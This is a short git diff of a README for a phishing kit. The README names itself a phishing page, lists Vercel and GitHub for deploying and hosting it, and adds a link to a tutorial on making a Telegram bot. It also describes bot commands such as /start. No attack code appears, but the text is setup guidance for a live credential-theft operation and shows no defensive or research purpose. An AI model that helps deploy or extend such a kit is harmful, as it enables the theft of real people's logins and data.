@@ -12,8 +12,12 @@ Watch the tutorial video on how to set up and use this phishing page:
 1. [Vercel](https://vercel.com/) – To deploy your phishing page.
 2. [GitHub](https://github.com/) – For hosting the code repository.
 
-## Bot Setup Commands
+# Bot Setup Commands
 
+## Bot Making Tutorial 
+[HOW TO MAKE TELEGRAM BOT](https://youtube.com/shorts/kGYjTGGwbAk?si=OSSbngPnH-frDYQV)
+
+ 
 ### `/start`
 Displays the welcome message and basic usage instructions for the bot.
 
